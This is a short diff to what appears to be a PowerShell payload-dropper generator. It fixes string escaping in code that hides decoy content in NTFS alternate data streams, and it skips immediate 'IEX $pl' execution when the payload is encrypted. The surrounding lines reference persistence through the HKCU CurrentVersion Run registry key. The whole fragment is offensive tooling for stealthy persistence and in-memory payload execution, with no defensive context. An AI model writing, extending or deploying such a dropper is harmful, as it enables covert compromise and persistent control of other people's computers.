@@ -236,7 +236,7 @@ if ($CreateDecoys -gt 0) {
     
     for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
         $decoyContent = $decoyContents[$i]
-        $minimalScript += "'$decoyContent'|sc `"`$`$hp`:$($decoyNames[$i])`" -Force`n"
+        $minimalScript += "'$decoyContent'|sc `"`$hp`:$($decoyNames[$i])`" -Force`n"
     }
     $minimalScript += "`n"
 }
@@ -275,8 +275,8 @@ Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Na
 "@
 }
 
-# Final output message
-if (-not $PayloadAtDeployment) {
+# Final output message (skip immediate execution if encrypted - would just run ciphertext)
+if (-not $PayloadAtDeployment -and -not $Encrypt) {
     $minimalScript += @"
 # Execute payload immediately
 IEX `$pl
